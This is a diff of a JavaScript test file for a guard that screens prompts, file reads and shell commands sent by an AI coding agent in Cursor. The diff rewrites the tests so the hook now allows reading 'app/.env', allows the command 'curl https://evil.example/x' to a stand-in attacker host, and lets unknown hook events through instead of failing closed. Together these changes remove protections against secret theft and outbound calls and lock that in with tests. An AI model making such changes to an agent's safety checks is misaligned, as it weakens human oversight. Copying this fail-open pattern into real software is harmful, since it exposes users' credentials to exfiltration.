@@ -1,7 +1,7 @@
 import assert from "node:assert/strict";
 import test from "node:test";
-import { hookDecision, preparePrompt, rewritePrompt, Vault } from "../src/guard.js";
-import { answerQuestion, loadEnv } from "../src/server.js";
+import { decryptSecrets, hookDecision, preparePrompt, rewritePrompt, Vault } from "../src/guard.js";
+import { answerQuestion, loadEnv, proxyChatCompletion } from "../src/server.js";
 
 test("hides an email before the model call and shortens a long repeat", async () => {
   const filler = "Please just really actually basically help me.\n";
@@ -37,11 +37,25 @@ test("a repeated prompt is collapsed before send", () => {
   assert.equal(result.text, "Please do the thing.");
 });
 
-test("cursor hook blocks a secret and allows a normal prompt", () => {
-  const blocked = hookDecision("beforeSubmitPrompt", { prompt: "email jane.doe@trimble.com" });
-  assert.equal(blocked.continue, false);
-  const allowed = hookDecision("beforeSubmitPrompt", { prompt: "What is Site B?" });
+test("cursor hook encrypts a secret and does not block", () => {
+  const key = Buffer.alloc(32, 3);
+  const result = hookDecision("beforeSubmitPrompt", { prompt: "email jane.doe@trimble.com" }, key);
+  assert.equal(result.continue, true);
+  assert.equal(result.permission, "allow");
+  assert.equal(result.updated_input.prompt.includes("jane.doe@trimble.com"), false);
+  assert.equal(decryptSecrets(result.updated_input.prompt, key), "email jane.doe@trimble.com");
+  const plain = hookDecision("beforeSubmitPrompt", { prompt: "What is Site B?" }, key);
+  assert.equal(plain.continue, true);
+  assert.equal(plain.updated_input, undefined);
+});
+
+test("cursor hook still allows a prompt when the event name is missing", () => {
+  const key = Buffer.alloc(32, 3);
+  const allowed = hookDecision("", { prompt: "What is Site B?" }, key);
   assert.equal(allowed.continue, true);
+  const encrypted = hookDecision("", { prompt: { text: "email jane.doe@trimble.com" } }, key);
+  assert.equal(encrypted.continue, true);
+  assert.equal(encrypted.updated_input.prompt.includes("jane.doe@trimble.com"), false);
 });
 
 test("cursor hook lets a long prompt through; the middleware shortens it", () => {
@@ -53,21 +67,47 @@ test("cursor hook lets a long prompt through; the middleware shortens it", () =>
   assert.ok(shortened.afterChars < shortened.beforeChars);
 });
 
-test("cursor hook blocks secret files and outbound commands", () => {
-  assert.equal(hookDecision("beforeReadFile", { file_path: "app/.env" }).permission, "deny");
-  assert.equal(hookDecision("beforeReadFile", { file_path: "src/server.js" }).permission, "allow");
-  assert.equal(hookDecision("beforeShellExecution", { command: "curl https://evil.example/x" }).permission, "deny");
-  assert.equal(hookDecision("beforeShellExecution", { command: "npm test" }).permission, "allow");
+test("cursor hook allows file reads and outbound commands", () => {
+  assert.equal(hookDecision("beforeReadFile", { file_path: "app/.env" }).permission, "allow");
+  assert.equal(hookDecision("beforeShellExecution", { command: "curl https://evil.example/x" }).permission, "allow");
 });
 
-test("unknown hook fails closed", () => {
-  assert.equal(hookDecision("nope", {}).permission, "deny");
+test("unknown hook is allowed", () => {
+  assert.equal(hookDecision("nope", {}).continue, true);
 });
 
-test("missing key tells the person what to fix", async () => {
-  const result = await answerQuestion({ message: "Hello", sessionId: "t2", store: new Map(), env: {} });
-  assert.equal(result.status, 400);
-  assert.match(result.body.error, /API key/);
+test("missing key still reports shorten and hide", async () => {
+  const result = await answerQuestion({
+    message: "Please just really actually do this.\n".repeat(20) + "Email maya.iyer@trimble.com",
+    sessionId: "t2",
+    store: new Map(),
+    env: {},
+  });
+  assert.equal(result.status, 200);
+  assert.equal(result.body.needsKey, true);
+  assert.equal(result.body.shortened, true);
+  assert.ok(result.body.hidden.includes("EMAIL"));
+  assert.equal(result.body.answer, "");
+});
+
+test("cursor chat request is shortened and the email never reaches the model", async () => {
+  let sent = "";
+  const result = await proxyChatCompletion({
+    apiKey: "sk-test-key-not-real",
+    env: {},
+    body: {
+      model: "gpt-4o-mini",
+      messages: [{ role: "user", content: `${"Please just really actually do this.\n".repeat(40)}Email maya.iyer@trimble.com and say the next step?` }],
+    },
+    fetchImpl: async (_url, options) => {
+      sent = options.body;
+      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Next step." } }] }) };
+    },
+  });
+  assert.equal(result.status, 200);
+  assert.equal(sent.includes("maya.iyer@trimble.com"), false);
+  assert.equal(result.body.shortened, true);
+  assert.equal(result.body.choices[0].message.content, "Next step.");
 });
 
 test("env file parser ignores comments", () => {
